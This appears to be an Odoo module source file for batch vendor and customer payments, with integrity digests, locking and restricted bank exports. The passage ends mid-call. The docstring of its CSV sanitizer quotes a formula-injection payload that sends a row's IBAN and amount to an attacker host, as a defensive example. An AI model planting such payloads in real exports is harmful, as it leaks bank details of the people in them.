# -*- encoding: utf-8 -*-
##############################################################################
#
# ERP Heritage
# Copyright (C) 2026 (https://www.erpheritage.com.au/)
#
##############################################################################
"""
eh.batch.payment: header for a batch of customer receipts or vendor payments.

A batch is the operational unit accountants think in: "today I'm paying
the seven vendor bills due this week, all from the AP bank account".
Instead of posting seven payments one by one, a manager builds the
batch once, reviews the totals, and posts the whole batch in a single
transaction. The underlying payments remain standard account.payment
records so every downstream Odoo flow (bank reconciliation, vendor
ledger, follow-up) sees them exactly as if they had been entered
individually.

State machine:

    draft -> confirmed -> posted -> reconciled
                       \\-> cancelled
              \\-> cancelled

The 'reconciled' state is informational; it flips to True once every
payment in the batch is fully reconciled against its source invoice.

Posting is atomic.  Every member and source document is locked and
revalidated immediately before cash moves.  If one payment fails, the
whole batch attempt rolls back and remains confirmed for correction.
"""

import base64
import csv
import hashlib
import hmac
import io
import json
import logging
import math
import re
from collections import defaultdict
from urllib.parse import urlencode

from psycopg2 import sql

from odoo import _, api, fields, models
from odoo.exceptions import AccessError, UserError

from .capabilities import (
    AUTHORIZED_BATCH_EXPORT_CAPABILITY,
    AUTHORIZED_BATCH_EXPORT_CONTEXT,
    AUTHORIZED_BATCH_POST_CAPABILITY,
    AUTHORIZED_BATCH_POST_CONTEXT,
    AUTHORIZED_BATCH_RECONCILE_CAPABILITY,
    AUTHORIZED_BATCH_RECONCILE_CONTEXT,
    AUTHORIZED_BATCH_REVERSAL_CAPABILITY,
    AUTHORIZED_BATCH_REVERSAL_CONTEXT,
    AUTHORIZED_BATCH_WORKFLOW_CAPABILITY,
    AUTHORIZED_BATCH_WORKFLOW_CONTEXT,
    has_authorized_batch_export_capability,
    has_authorized_batch_workflow_capability,
)
from .batch_sequence import next_batch_reference

_logger = logging.getLogger(__name__)

# account.payment in Odoo 19 has no 'posted' state: a successfully posted
# payment lands in 'in_process' (or 'paid' once the bank move reconciles).
# These are the states that mean "the payment moved cash".
POSTED_STATES = ('in_process', 'paid')

# A transaction-scoped advisory lock closes the phantom-insert window that
# row locks alone cannot cover: two transactions could otherwise lock the
# same source invoice, both find no account.payment claim, and each insert a
# new claim.  The key is deliberately module-wide.  Batch-payment mutations
# are short, while correctness (never paying one source twice) matters more
# than parallel build throughput.
_BATCH_ADVISORY_LOCK_KEY = 'eh_account_batch_payment.integrity.v1'
_MOVE_OWNER_ADVISORY_PREFIX = 'eh_account_batch_payment.move_owner.v1:'
_PAYMENT_OWNER_ADVISORY_PREFIX = 'eh_account_batch_payment.payment_owner.v1:'
# Overlapping owner sets must share a lock, but taking one advisory lock for
# every move/payment can exhaust max_locks_per_transaction on a large import.
# Stable stripes retain overlap exclusion while bounding one transaction to
# at most twice this small, deterministic number of owner locks.
_OWNER_LOCK_STRIPES = 64

# Header values frozen once review starts. Financial inputs determine cash
# routing; notes remain non-authoritative commentary but are preserved so the
# displayed operator context cannot be silently rewritten after confirmation.
_BATCH_FINANCIAL_FIELDS = frozenset({
    'name', 'batch_type', 'journal_id', 'payment_method_line_id',
    'payment_date', 'company_id', 'payment_ids',
    'export_file', 'export_filename',
    'notes',
})

_BATCH_GENERATED_EXPORT_FIELDS = frozenset({
    'export_file', 'export_filename',
})
_BATCH_COMPUTED_EVIDENCE_FIELDS = (
    'currency_id', 'payment_count', 'total_amount', 'posted_count',
    'reconciled_count', 'is_fully_reconciled', 'is_mixed_currency',
)

# Leading characters Excel/LibreOffice treat as the start of a formula. A
# leading tab or carriage return is also honoured, so guard those too.
_CSV_INJECTION_LEADERS = ('=', '+', '-', '@', '\t', '\r', '\n')


def _safe_csv_cell(value):
    """Neutralise spreadsheet formula injection in a CSV cell.

    Partner names, payment memos and bank references are free-form and
    typically authored by lower-trust actors (vendor-create clerks,
    inbound supplier-invoice fields) than the manager who exports the
    batch. Excel and LibreOffice auto-execute a cell whose text begins
    with '=', '+', '-' or '@' (or a leading tab/CR) as a formula, so a
    partner named =HYPERLINK("http://evil.tld/x?d="&C2,"ok") would beacon
    the row's IBAN and amount on open. Prefix any such string with an
    apostrophe so the cell renders as literal text. Mirrors
    eh_account_base/tools/xlsx_writer.py::_safe_cell_text for the CSV
    path. Non-string values are returned unchanged.
    """
    if isinstance(value, str) and value[:1] in _CSV_INJECTION_LEADERS:
        return "'" + value
    return value


def _payment_memo(payment):
    """Return cross-series payment memo (`ref` before Odoo 18)."""
    field_name = 'memo' if 'memo' in payment._fields else 'ref'
    return payment[field_name] or ''


def _safe_export_filename(batch_name, batch_id):
    """Return an ASCII filename safe for headers and URL query strings."""
    stem = re.sub(r'[^A-Za-z0-9._-]+', '_', batch_name or '')
    stem = stem.strip('._')[:100]
    return "%s.csv" % (stem or "batch_%s" % batch_id)


class EhBatchPayment(models.Model):
    _name = 'eh.batch.payment'
    _description = "Batch payment"
    _inherit = [
        'mail.thread', 'mail.activity.mixin', 'eh.workflow.guard',
        'eh.list.statistics.mixin',
    ]
    _order = 'payment_date desc, id desc'
    _rec_name = 'name'

    # These fields are workflow provenance, not editable business inputs.
    # ``readonly=True`` only protects the web client; the shared workflow
    # guard closes direct RPC/ORM writes and strips forged values on create.
    _eh_guarded_fields = (
        'state',
        'integrity_digest',
        'integrity_quarantined',
        'export_snapshot_json', 'export_hash',
        'confirmed_at', 'confirmed_by_id',
        'posted_at', 'posted_by_id',
        'cancelled_at', 'cancelled_by_id',
        'reversed_at', 'reversed_by_id',
    ) + _BATCH_COMPUTED_EVIDENCE_FIELDS

    name = fields.Char(
        required=True, copy=False, default='/', tracking=True,
        help=(
            "Batch reference. Auto-generated from a sequence at create "
            "time when left as the default '/'. Manual entry is allowed "
            "for backfills from a legacy system."
        ),
    )
    state = fields.Selection(
        [
            ('draft', "Draft"),
            ('confirmed', "Confirmed"),
            ('posted', "Posted"),
            ('cancelled', "Cancelled"),
        ],
        default='draft', required=True, tracking=True, index=True,
        help=(
            "draft: still building the batch, members can be added or "
            "removed. confirmed: locked from member edits, ready to "
            "post. posted: every member payment has been posted; cash "
            "has moved. cancelled: terminal, members released back to "
            "the open pool."
        ),
    )
    batch_type = fields.Selection(
        [
            ('inbound', "Inbound (customer receipts)"),
            ('outbound', "Outbound (vendor payments)"),
        ],
        required=True, default='outbound', tracking=True,
        help=(
            "Direction of the batch. Inbound batches group customer "
            "receipts (debits to bank); outbound batches group vendor "
            "payments (credits from bank). The wizard filters add-able "
            "moves accordingly."
        ),
    )
    journal_id = fields.Many2one(
        'account.journal', required=True, tracking=True,
        domain="[('type', 'in', ['bank', 'cash'])]",
        ondelete='restrict',
        help=(
            "Bank or cash journal to debit (inbound) or credit "
            "(outbound). Drives the batch's currency and the SEPA "
            "originator lookup when the SEPA CT module is installed."
        ),
    )
    payment_method_line_id = fields.Many2one(
        'account.payment.method.line',
        string="Payment method",
        domain=(
            "[('journal_id', '=', journal_id),"
            " ('payment_type', '=', "
            "  ('inbound' if batch_type == 'inbound' else 'outbound'))]"
        ),
        help=(
            "Specific payment method on the journal (e.g. SEPA CT, "
            "ACH, manual). Filtered to methods available for the "
            "journal's direction."
        ),
    )
    payment_date = fields.Date(
        required=True, default=fields.Date.context_today, tracking=True,
        help=(
            "Default date copied to payments created by the build wizard. "
            "Defaults to today; override to schedule a future-dated batch. "
            "Pre-existing payments keep their own explicitly reviewed date."
        ),
    )

    company_id = fields.Many2one(
        'res.company', required=True,
        default=lambda self: self.env.company,
        index=True,
        help="Legal entity this batch belongs to.",
    )
    currency_id = fields.Many2one(
        'res.currency',
        compute='_compute_currency_id',
        store=True, readonly=True,
        help=(
            "Presentation currency for batch totals. Uses the journal "
            "currency when configured and otherwise the company currency."
        ),
    )

    payment_ids = fields.One2many(
        'account.payment', 'eh_batch_payment_id',
        copy=False,
        help="Member payments belonging to this batch.",
    )

    payment_count = fields.Integer(
        compute='_compute_totals', store=True,
        help="Number of member payments in the batch.",
    )
    total_amount = fields.Monetary(
        compute='_compute_totals', store=True,
        currency_field='currency_id',
        help="Sum of member payment amounts in the batch's currency.",
    )
    posted_count = fields.Integer(
        compute='_compute_totals', store=True,
        help=(
            "Number of member payments already posted. Used by the "
            "form to surface partial posting after a per-payment "
            "savepoint failure."
        ),
    )
    reconciled_count = fields.Integer(
        compute='_compute_totals', store=True,
        help=(
            "Number of posted member payments that have been fully "
            "reconciled against bank statement lines."
        ),
    )
    is_fully_reconciled = fields.Boolean(
        compute='_compute_totals', store=True,
        help=(
            "True when every member payment is fully reconciled. "
            "Closes the loop for period-end reporting."
        ),
    )
    is_mixed_currency = fields.Boolean(
        compute='_compute_totals', store=True,
        help=(
            "True when members use more than one payment currency. The "
            "header total is then converted to the displayed batch currency "
            "at each member's reviewed payment date."
        ),
    )

    notes = fields.Html(
        help=(
            "Free-form operational commentary preserved after confirmation. "
            "Notes are not approval evidence and are not included in the "
            "batch integrity digest."
        ),
    )

    # ---- export (manager-only bank details) ----
    export_file = fields.Binary(
        string="Bank export file",
        attachment=True,
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help=(
            "CSV export of the batch containing partner bank account "
            "numbers. Stored as a field attachment restricted to EH "
            "Accounting Managers, so the file served at /web/content is "
            "not readable by ordinary accounting users."
        ),
    )
    export_filename = fields.Char(
        string="Bank export filename",
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help="Filename used when downloading the bank export.",
    )
    export_snapshot_json = fields.Text(
        readonly=True,
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help=(
            "Immutable CSV rows captured at confirmation. The posted bank "
            "file is rendered only from this approved snapshot, never from "
            "mutable partner or bank-account master data."
        ),
    )
    export_hash = fields.Char(
        readonly=True,
        copy=False,
        groups='eh_account_base.group_eh_manager',
        help=(
            "SHA-256 fingerprint of the exact posted bank-export bytes. "
            "Every ORM or HTTP read is verified against this value."
        ),
    )
    preview_export_file = fields.Binary(
        string="Approved bank export preview",
        compute='_compute_export_preview',
        groups='eh_account_base.group_eh_manager',
        help=(
            "Read-only preview rendered from the exact snapshot frozen at "
            "confirmation. It never creates or replaces posted bank evidence."
        ),
    )
    preview_export_filename = fields.Char(
        compute='_compute_export_preview',
        groups='eh_account_base.group_eh_manager',
    )

    # ---- audit ----
    confirmed_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch was confirmed (locked from edits).",
    )
    confirmed_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who confirmed the batch.",
    )
    posted_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch's payments were posted.",
    )
    posted_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who posted the batch.",
    )
    cancelled_at = fields.Datetime(
        readonly=True, tracking=True,
        help="Timestamp at which the batch was cancelled.",
    )
    cancelled_by_id = fields.Many2one(
        'res.users', readonly=True,
        help="User who cancelled the batch.",
    )
    reversed_at = fields.Datetime(
        readonly=True, tracking=True, copy=False,
        help=(
            "Timestamp at which controlled counter-entries reversed every "
            "posted member payment. Original cash moves remain posted and "
            "immutable."
        ),
    )
    reversed_by_id = fields.Many2one(
        'res.users', readonly=True, copy=False,
        help="Manager who ran controlled batch reversal.",
    )
    integrity_digest = fields.Char(
        readonly=True,
        copy=False,
        help=(
            "Cryptographic snapshot of the approved header, members, source "
            "documents, residuals, currencies, and bank destinations. A "
            "confirmed batch is refused if any approved value later drifts."
        ),
    )
    integrity_quarantined = fields.Boolean(
        readonly=True,
        copy=False,
        help=(
            "Upgrade quarantine for legacy approvals whose original review "
            "snapshot cannot be proven. Draft rows must be reviewed and "
            "confirmed again; posted rows remain immutable audit evidence."
        ),
    )

    def _eh_member_payments(self):
        """Return authoritative members without caller record-rule gaps.

        Public actions first authorize the batch itself.  Once authorized,
        every financial decision must use the database's complete inverse
        Many2one set: a caller-filtered ``payment_ids`` relation could hide a
        corrupt cross-company member and otherwise let validation/post/reset
        silently skip it.
        """
        self.ensure_one()
        if not self.id:
            return self.payment_ids.sudo()
        return self.env['account.payment'].sudo().search([
            ('eh_batch_payment_id', '=', self.id),
        ], order='id')

    @api.model
    def _eh_digest_amount(self, currency, amount):
        """Stable JSON value at the currency's accounting precision."""
        return str(currency.round(amount or 0.0))

    @api.model
    def _eh_digest_float(self, amount):
        """Return exact, stable evidence for one database float value."""
        value = float(amount or 0.0)
        if not math.isfinite(value):
            raise UserError(_(
                "A source settlement line contains a non-finite accounting "
                "amount and cannot be approved for batch payment."
            ))
        # Treat IEEE signed zero as one accounting value while preserving every
        # other round-trip float exactly; sub-currency-unit drift must fail too.
        if value == 0.0:
            value = 0.0
        return repr(value)

    def _eh_source_reconciliation_payload(self, source_line):
        """Prove and serialize the complete graph behind one source AML."""
        graph_lines = source_line.sudo()
        graph_partials = self.env['account.partial.reconcile'].sudo()
        frontier = graph_lines
        while frontier:
            new_partials = (
                frontier.matched_debit_ids | frontier.matched_credit_ids
            ) - graph_partials
            if not new_partials:
                break
            graph_partials |= new_partials
            frontier = (
                new_partials.debit_move_id | new_partials.credit_move_id
            ) - graph_lines
            graph_lines |= frontier
        graph_lines = graph_lines.sorted('id')
        graph_partials = graph_partials.sorted('id')
        graph_line_ids = set(graph_lines.ids)
        expected_company = source_line.company_id
        expected_company_currency = source_line.company_currency_id
        expected_account = source_line.account_id
        expected_partner = source_line.partner_id.commercial_partner_id
        debit_company = defaultdict(float)
        credit_company = defaultdict(float)
        debit_currency = defaultdict(float)
        credit_currency = defaultdict(float)
        partial_payload = []

        for partial in graph_partials:
            debit = partial.debit_move_id
            credit = partial.credit_move_id
            values = (
                partial.amount,
                partial.debit_amount_currency,
                partial.credit_amount_currency,
            )
            for value in values:
                self._eh_digest_float(value)
            if (
                debit.id not in graph_line_ids
                or credit.id not in graph_line_ids
                or debit.company_id != credit.company_id
                or debit.company_id != expected_company
                or debit.account_id != credit.account_id
                or debit.account_id != expected_account
                or partial.company_id != expected_company
                or partial.company_currency_id != expected_company_currency
                or partial.debit_currency_id != debit.currency_id
                or partial.credit_currency_id != credit.currency_id
                or partial.max_date != max(debit.date, credit.date)
                or any(value < 0.0 for value in values)
                or partial.amount
                != expected_company_currency.round(partial.amount)
                or partial.debit_amount_currency
                != debit.currency_id.round(partial.debit_amount_currency)
                or partial.credit_amount_currency
                != credit.currency_id.round(partial.credit_amount_currency)
                or (
                    debit.currency_id == expected_company_currency
                    and partial.debit_amount_currency != partial.amount
                )
                or (
                    credit.currency_id == expected_company_currency
                    and partial.credit_amount_currency != partial.amount
                )
                or (
                    debit.currency_id == credit.currency_id
                    and partial.debit_amount_currency
                    != partial.credit_amount_currency
                )
                or all(
                    currency.is_zero(value)
                    for currency, value in (
                        (expected_company_currency, partial.amount),
                        (debit.currency_id, partial.debit_amount_currency),
                        (credit.currency_id, partial.credit_amount_currency),
                    )
                )
            ):
                raise UserError(_(
                    "Source settlement reconciliation %(partial)s no longer "
                    "matches its endpoints, company, currencies, date, or "
                    "accounting amounts.",
                    partial=partial.display_name,
                ))
            debit_company[debit.id] += partial.amount
            credit_company[credit.id] += partial.amount
            debit_currency[debit.id] += partial.debit_amount_currency
            credit_currency[credit.id] += partial.credit_amount_currency
            values_payload = {
                'id': partial.id,
                'debit_move_id': debit.id,
                'credit_move_id': credit.id,
                'company_id': partial.company_id.id,
                'company_currency_id': partial.company_currency_id.id,
                'debit_currency_id': partial.debit_currency_id.id,
                'credit_currency_id': partial.credit_currency_id.id,
                'amount': self._eh_digest_float(partial.amount),
                'debit_amount_currency': self._eh_digest_float(
                    partial.debit_amount_currency,
                ),
                'credit_amount_currency': self._eh_digest_float(
                    partial.credit_amount_currency,
                ),
                'full_reconcile_id': partial.full_reconcile_id.id,
                'exchange_move_id': partial.exchange_move_id.id,
                'max_date': fields.Date.to_string(partial.max_date),
            }
            if 'draft_caba_move_vals' in partial._fields:
                values_payload['draft_caba_move_vals'] = (
                    partial.draft_caba_move_vals or {}
                )
            partial_payload.append(values_payload)

        full_ids = set(graph_partials.mapped('full_reconcile_id').ids)
        line_full_ids = set(graph_lines.mapped('full_reconcile_id').ids)
        if (
            full_ids != line_full_ids
            or len(full_ids) > 1
            or (
                full_ids
                and any(not graph_line.full_reconcile_id for graph_line in graph_lines)
            )
        ):
            raise UserError(_(
                "Source settlement reconciliation graph has inconsistent "
                "full-reconciliation ownership."
            ))

        line_payload = []
        for graph_line in graph_lines:
            numeric_values = (
                graph_line.debit,
                graph_line.credit,
                graph_line.balance,
                graph_line.amount_currency,
                graph_line.amount_residual,
                graph_line.amount_residual_currency,
            )
            for value in numeric_values:
                self._eh_digest_float(value)
            company_values = (
                graph_line.debit,
                graph_line.credit,
                graph_line.balance,
                graph_line.amount_residual,
            )
            transaction_values = (
                graph_line.amount_currency,
                graph_line.amount_residual_currency,
            )
            expected_residual = expected_company_currency.round(
                graph_line.balance
                - debit_company[graph_line.id]
                + credit_company[graph_line.id],
            )
            expected_currency_residual = graph_line.currency_id.round(
                graph_line.amount_currency
                - debit_currency[graph_line.id]
                + credit_currency[graph_line.id],
            )
            if (
                not graph_line.move_id
                or graph_line.move_id.state != 'posted'
                or graph_line.parent_state != 'posted'
                or graph_line.company_id != expected_company
                or graph_line.company_id != graph_line.move_id.company_id
                or graph_line.company_currency_id
                != expected_company_currency
                or graph_line.account_id != expected_account
                or not graph_line.account_id.reconcile
                or not graph_line.partner_id
                or graph_line.partner_id.commercial_partner_id
                != expected_partner
                or graph_line.journal_id != graph_line.move_id.journal_id
                or graph_line.date != graph_line.move_id.date
                or any(
                    value != expected_company_currency.round(value)
                    for value in company_values
                )
                or any(
                    value != graph_line.currency_id.round(value)
                    for value in transaction_values
                )
                or graph_line.debit < 0.0
                or graph_line.credit < 0.0
                or (
                    not expected_company_currency.is_zero(graph_line.debit)
                    and not expected_company_currency.is_zero(
                        graph_line.credit,
                    )
                )
                or not expected_company_currency.is_zero(
                    graph_line.balance
                    - graph_line.debit
                    + graph_line.credit,
                )
                or graph_line.amount_residual != expected_residual
                or graph_line.amount_residual_currency
                != expected_currency_residual
                or graph_line.reconciled != (
                    expected_company_currency.is_zero(expected_residual)
                    and graph_line.currency_id.is_zero(
                        expected_currency_residual,
                    )
                )
                or (
                    graph_line.currency_id == expected_company_currency
                    and (
                        graph_line.amount_currency != graph_line.balance
                        or graph_line.amount_residual_currency
                        != graph_line.amount_residual
                    )
                )
            ):
                raise UserError(_(
                    "Source settlement reconciliation endpoint %(line)s no "
                    "longer matches its posted move, account, partner, "
                    "company, journal, date, currency, or residual graph.",
                    line=graph_line.display_name,
                ))
            line_payload.append({
                'id': graph_line.id,
                'move_id': graph_line.move_id.id,
                'account_id': graph_line.account_id.id,
                'partner_id': graph_line.partner_id.id,
                'company_id': graph_line.company_id.id,
                'journal_id': graph_line.journal_id.id,
                'date': fields.Date.to_string(graph_line.date),
                'parent_state': graph_line.parent_state,
                'currency_id': graph_line.currency_id.id,
                'company_currency_id': graph_line.company_currency_id.id,
                'reconciled': bool(graph_line.reconciled),
                'full_reconcile_id': graph_line.full_reconcile_id.id,
                'matching_number': graph_line.matching_number or '',
                'debit': self._eh_digest_float(graph_line.debit),
                'credit': self._eh_digest_float(graph_line.credit),
                'balance': self._eh_digest_float(graph_line.balance),
                'amount_currency': self._eh_digest_float(
                    graph_line.amount_currency,
                ),
                'amount_residual': self._eh_digest_float(
                    graph_line.amount_residual,
                ),
                'amount_residual_currency': self._eh_digest_float(
                    graph_line.amount_residual_currency,
                ),
            })
        return {
            'lines': line_payload,
            'partials': partial_payload,
        }

    def _eh_assert_source_settlement_lines(self, payment, source):
        """Return exact AR/AP evidence after proving source-line semantics."""
        self.ensure_one()
        lines = source.line_ids.sudo().filtered(
            lambda line: line.account_id.account_type in (
                'asset_receivable', 'liability_payable',
            ),
        ).sorted('id')
        line_ids = lines.ids
        if not lines:
            raise UserError(_(
                "Source %(source)s has no receivable/payable settlement line.",
                source=source.display_name,
            ))
        if len(line_ids) != len(set(line_ids)):
            raise UserError(_(
                "Source %(source)s contains duplicate settlement-line "
                "evidence.",
                source=source.display_name,
            ))

        expected_account_type = (
            'asset_receivable'
            if payment.partner_type == 'customer'
            else 'liability_payable'
        )
        expected_partner = source.commercial_partner_id
        expected_company_currency = source.company_id.currency_id
        for line in lines:
            numeric_values = (
                line.debit,
                line.credit,
                line.balance,
                line.amount_currency,
                line.amount_residual,
                line.amount_residual_currency,
            )
            # Force finite/exact conversion during both validation and digest
            # construction; PostgreSQL corruption such as NaN must fail closed.
            for value in numeric_values:
                self._eh_digest_float(value)
            company_amounts = (
                line.debit,
                line.credit,
                line.balance,
                line.amount_residual,
            )
            transaction_amounts = (
                line.amount_currency,
                line.amount_residual_currency,
            )
            if (
                line.move_id != source
                or line.account_id.account_type != expected_account_type
                or not line.account_id.reconcile
                or line.account_id != payment.destination_account_id
                or not line.partner_id
                or line.partner_id != expected_partner
                or line.partner_id.commercial_partner_id
                != payment.partner_id.commercial_partner_id
                or line.company_id != source.company_id
                or line.company_id != payment.company_id
                or line.journal_id != source.journal_id
                or line.date != source.date
                or line.parent_state != source.state
                or line.currency_id != source.currency_id
                or line.company_currency_id != expected_company_currency
                or any(
                    value != expected_company_currency.round(value)
                    for value in company_amounts
                )
                or any(
                    value != line.currency_id.round(value)
                    for value in transaction_amounts
                )
                or line.debit < 0.0
                or line.credit < 0.0
                or (
                    not expected_company_currency.is_zero(line.debit)
                    and not expected_company_currency.is_zero(line.credit)
                )
                or not expected_company_currency.is_zero(
                    line.balance - line.debit + line.credit,
                )
                or line.reconciled != (
                    expected_company_currency.is_zero(line.amount_residual)
                    and line.currency_id.is_zero(
                        line.amount_residual_currency,
                    )
                )
                or (
                    line.currency_id == expected_company_currency
                    and (
                        not expected_company_currency.is_zero(
                            line.amount_currency - line.balance,
                        )
                        or not expected_company_currency.is_zero(
                            line.amount_residual_currency
                            - line.amount_residual,
                        )
                    )
                )
            ):
                raise UserError(_(
                    "Source %(source)s settlement line %(line)s no longer "
                    "matches its receivable/payable account, partner, move, "
                    "company, journal, date, currency, or balance semantics.",
                    source=source.display_name,
                    line=line.display_name,
                ))
            self._eh_source_reconciliation_payload(line)
        return lines

    def _eh_source_settlement_payload(self, payment, source):
        """Serialize exact locked settlement AML evidence for approval."""
        lines = self._eh_assert_source_settlement_lines(payment, source)
        return [{
            'id': line.id,
            'move_id': line.move_id.id,
            'account_id': line.account_id.id,
            'partner_id': line.partner_id.id,
            'company_id': line.company_id.id,
            'journal_id': line.journal_id.id,
            'date': fields.Date.to_string(line.date),
            'parent_state': line.parent_state,
            'currency_id': line.currency_id.id,
            'company_currency_id': line.company_currency_id.id,
            'reconciled': bool(line.reconciled),
            'full_reconcile_id': line.full_reconcile_id.id,
            'matching_number': line.matching_number or '',
            'debit': self._eh_digest_float(line.debit),
            'credit': self._eh_digest_float(line.credit),
            'balance': self._eh_digest_float(line.balance),
            'amount_currency': self._eh_digest_float(line.amount_currency),
            'amount_residual': self._eh_digest_float(line.amount_residual),
            'amount_residual_currency': self._eh_digest_float(
                line.amount_residual_currency,
            ),
            'reconciliation_graph': self._eh_source_reconciliation_payload(
                line,
            ),
        } for line in lines]

    def _eh_integrity_payload(self, export_snapshot_json=None):
        """Build the immutable approval snapshot for one batch."""
        self.ensure_one()
        batch = self.sudo()
        effective_currency = (
            batch.journal_id.currency_id or batch.company_id.currency_id
        )
        payment_payloads = []
        batch_settlement_line_ids = set()
        for payment in batch._eh_member_payments():
            sources = payment.eh_source_move_ids.sudo().sorted('id')
            payment_currency = payment.currency_id or effective_currency
            source_payloads = []
            for source in sources:
                settlement_lines = batch._eh_source_settlement_payload(
                    payment, source,
                )
                current_line_ids = {
                    line_payload['id'] for line_payload in settlement_lines
                }
                if batch_settlement_line_ids & current_line_ids:
                    raise UserError(_(
                        "Batch %(batch)s contains duplicate source "
                        "settlement-line evidence across its payments.",
                        batch=batch.display_name,
                    ))
                batch_settlement_line_ids.update(current_line_ids)
                source_payloads.append({
                    'id': source.id,
                    'company_id': source.company_id.id,
                    'currency_id': source.currency_id.id,
                    'residual': self._eh_digest_amount(
                        source.currency_id, source.amount_residual,
                    ),
                    'state': source.state,
                    'payment_state': source.payment_state,
                    'move_type': source.move_type,
                    'partner_id': source.commercial_partner_id.id,
                    'settlement_lines': settlement_lines,
                })
            payment_payloads.append({
                'id': payment.id,
                'date': fields.Date.to_string(payment.date),
                'journal_id': payment.journal_id.id,
                'company_id': payment.company_id.id,
                'amount': self._eh_digest_amount(
                    payment_currency, payment.amount,
                ),
                'currency_id': payment_currency.id,
                'payment_type': payment.payment_type,
                'partner_type': payment.partner_type,
                'partner_id': payment.partner_id.id,
                'partner_bank_id': payment.partner_bank_id.id,
                'partner_bank_account': (
                    payment.partner_bank_id.acc_number or ''
                ),
                'payment_method_line_id': payment.payment_method_line_id.id,
                'memo': _payment_memo(payment),
                'payment_reference': payment.payment_reference or '',
                'outstanding_account_id': payment.outstanding_account_id.id,
                'destination_account_id': payment.destination_account_id.id,
                'invoice_ids': sorted(
                    payment._eh_core_invoice_moves().ids
                ),
                'sources': source_payloads,
            })
        if export_snapshot_json is None:
            export_snapshot_json = batch.export_snapshot_json or ''
        return {
            'batch': {
                'id': batch.id,
                'name': batch.name,
                'batch_type': batch.batch_type,
                'journal_id': batch.journal_id.id,
                'payment_method_line_id': batch.payment_method_line_id.id,
                'payment_date': fields.Date.to_string(batch.payment_date),
                'company_id': batch.company_id.id,
                'currency_id': effective_currency.id,
            },
            'payments': payment_payloads,
            'export_snapshot_json': export_snapshot_json,
        }

    def _eh_compute_integrity_digest(self, export_snapshot_json=None):
        self.ensure_one()
        encoded = json.dumps(
            self._eh_integrity_payload(
                export_snapshot_json=export_snapshot_json,
            ),
            ensure_ascii=False,
            separators=(',', ':'),
            sort_keys=True,
        ).encode('utf-8')
        return hashlib.sha256(encoded).hexdigest()

    def _eh_assert_confirmation_digest(self):
        """Fail closed for legacy or drifted confirmed instructions."""
        self.ensure_one()
        expected = self.integrity_digest
        if not expected:
            raise UserError(_(
                "This confirmed batch predates the integrity snapshot and "
                "cannot be posted safely. Cancel it, return it to draft, "
                "review it, and confirm it again."
            ))
        current = self._eh_compute_integrity_digest()
        if not hmac.compare_digest(expected, current):
            raise UserError(_(
                "The approved batch instruction has changed since "
                "confirmation. No payment was posted. Cancel the batch, "
                "return it to draft, review the current values, and confirm "
                "it again."
            ))
        return True

    @api.model
    @api.private
    def _eh_quarantine_legacy_integrity(self):
        """Apply the fail-closed 19.0.1.1.5 approval upgrade policy.

        A cryptographic snapshot created after the fact would merely attest
        to migration-time values, not to what a human approved.  Therefore:

        * legacy ``confirmed`` rows return to draft, lose stale approval/export
          metadata, and must be reviewed and confirmed again;
        * legacy ``posted`` rows stay posted with all cash/audit evidence
          intact, but are explicitly quarantined and cannot generate a new
          bank export from mutable master data.

        The quarantine flag makes this operation idempotent and visible.
        """
        legacy = self.sudo().search([
            ('state', 'in', ('confirmed', 'posted')),
            ('integrity_digest', '=', False),
            ('integrity_quarantined', '=', False),
        ], order='id')
        confirmed = legacy.filtered(lambda batch: batch.state == 'confirmed')
        posted = legacy - confirmed

        legacy_export_attachments = self.env['ir.attachment'].sudo(
        ).with_context(skip_res_field_check=True).search([
            ('res_model', '=', self._name),
            ('res_field', '=', 'export_file'),
        ])
        legacy_export_attachments.with_context(**{
            AUTHORIZED_BATCH_EXPORT_CONTEXT:
                AUTHORIZED_BATCH_EXPORT_CAPABILITY,
        })._eh_force_batch_export_filestore()
        legacy_draft_ids = set(legacy_export_attachments.mapped('res_id'))
        legacy_draft_ids.update(self.sudo().search([
            ('state', '=', 'draft'),
            '|', '|',
            ('export_filename', '!=', False),
            ('export_hash', '!=', False),
            ('export_snapshot_json', '!=', False),
        ]).ids)
        drafts = self.sudo().browse(sorted(legacy_draft_ids)).exists().filtered(
            lambda batch: batch.state == 'draft',
        )

        for batch in drafts:
            batch._eh_workflow_write({
                'integrity_digest': False,
                'integrity_quarantined': True,
                'confirmed_at': False,
                'confirmed_by_id': False,
                'posted_at': False,
                'posted_by_id': False,
                'cancelled_at': False,
                'cancelled_by_id': False,
                'export_snapshot_json': False,
                'export_hash': False,
            })
            batch.with_context(**{
                AUTHORIZED_BATCH_EXPORT_CONTEXT:
                    AUTHORIZED_BATCH_EXPORT_CAPABILITY,
            }).write({
                'export_file': False,
                'export_filename': False,
            })

        for batch in confirmed:
            batch._eh_workflow_write({
                'state': 'draft',
                'integrity_digest': False,
                'integrity_quarantined': True,
                'confirmed_at': False,
                'confirmed_by_id': False,
                'posted_at': False,
                'posted_by_id': False,
                'cancelled_at': False,
                'cancelled_by_id': False,
                'export_snapshot_json': False,
                'export_hash': False,
            })
            # A file built under an unprovable approval must not survive as a
            # bank instruction. This narrow generator-owned corridor runs only
            # after the header has safely returned to draft.
            batch.with_context(
                **{
                    AUTHORIZED_BATCH_EXPORT_CONTEXT:
                        AUTHORIZED_BATCH_EXPORT_CAPABILITY,
                },
            ).write({
                'export_file': False,
                'export_filename': False,
            })

        for batch in posted:
            batch._eh_workflow_write({
                'integrity_quarantined': True,
            })

        # A prior upgrade may already have quarantined posted headers before
        # cash-move sealing existed. Freeze canonical/direct posted member
        # moves as unverified legacy evidence; never promote them to verified
        # eh_sealed provenance after the fact.
        posted_quarantined = self.sudo().search([
            ('state', '=', 'posted'),
            ('integrity_digest', '=', False),
            ('integrity_quarantined', '=', True),
        ], order='id')
        Move = self.env['account.move'].sudo()
        owner_field = Move._eh_batch_payment_owner_field()
        legacy_moves = Move
        for batch in posted_quarantined:
            members = batch._eh_member_payments()
            legacy_moves |= members.mapped('move_id')
            if owner_field and members:
                legacy_moves |= Move.search([
                    (owner_field, 'in', members.ids),
                ], order='id')
        legacy_moves = legacy_moves.filtered(
            lambda move: move.state == 'posted' or move.posted_before,
        )
        if legacy_moves:
            legacy_moves.flush_recordset([
